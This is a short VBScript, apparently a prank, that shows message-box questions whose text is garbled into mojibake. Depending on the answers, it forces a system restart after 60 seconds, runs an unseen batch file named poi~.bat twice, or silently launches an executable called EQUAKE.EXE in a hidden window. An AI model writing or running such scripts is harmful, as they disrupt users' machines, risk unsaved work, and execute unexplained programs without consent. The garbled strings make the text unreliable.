Dim Response
Set ws = CreateObject("Wscript.Shell") 
Response = Msgbox ("���ʣ���һ����Ӣ�����" , 36 , "�ᆖ")
If Response = vbYes Then
Msgbox "�ǾͶ���233", 0 ,"�ǺǺǺǺ�"
ws.run "cmd /k shutdown /r /t 60"
ws.run "cmd /k poi~.bat"
ws.run "cmd /k poi~.bat"
End If
If Response = vbNo Then
Response = Msgbox ("���ʣ���һ������ѧ����" , 36 , "�ᆖ")
If Response = vbYes Then
Msgbox "û����û����û����", 0 ,"û����"
End If
If Response = vbNo Then
Response = Msgbox ("���ʣ���һ��������/��ѧ����" , 36 , "�ᆖ")
If Response = vbYes Then
ws.run "cmd /k EQUAKE.EXE",vbhide
End If
End If
End If